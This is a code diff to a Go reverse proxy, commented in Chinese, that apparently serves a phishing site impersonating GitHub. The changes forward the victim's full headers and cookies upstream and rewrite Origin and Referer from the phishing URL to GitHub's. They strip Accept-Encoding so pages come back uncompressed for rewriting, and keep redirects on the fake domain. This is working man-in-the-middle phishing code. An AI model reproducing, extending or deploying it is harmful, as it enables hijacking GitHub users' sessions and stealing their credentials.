@@ -33,7 +33,7 @@ func handler(w http.ResponseWriter, r *http.Request) {
 	// 取代後的 body
 	body = replaceURLInResp(body, header)
 
-	// 如果 status code 是 3XX 就取代 Location 網址
+	// 如果 status code 是 3XX 就取代 Location 網址，避免直接導會github.com
 	if statusCode >= 300 && statusCode < 400 {
 		location := header.Get("Location")
 		// -1的意思是取代全部
@@ -65,9 +65,21 @@ func cloneRequest(r *http.Request) *http.Request {
 	if err != nil {
 		panic(err)
 	}
+
+	// 處理Header
 	// 把原請求的 cookie 複製到 req 的 cookie 裡面
 	// 這樣請求被發到 Github 時就會帶上 cookie
-	req.Header["Cookie"] = r.Header["Cookie"]
+	//req.Header["Cookie"] = r.Header["Cookie"]
+	//複製整個header
+	req.Header = r.Header
+	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
+	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
+
+	req.Header.Del("Accept-Encoding") //直接把Accept-Encoding刪掉，這樣github就能直接回傳html各式而不是壓縮過的各式
+	//origin 是目前網站的 <schema>://<host>:<port> 組合而成的字串
+	req.Header.Set("Origin", origin)
+	//referer 是 當你發出請求時網頁在哪個網址
+	req.Header.Set("Referer", referer)
 	return req
 }
 
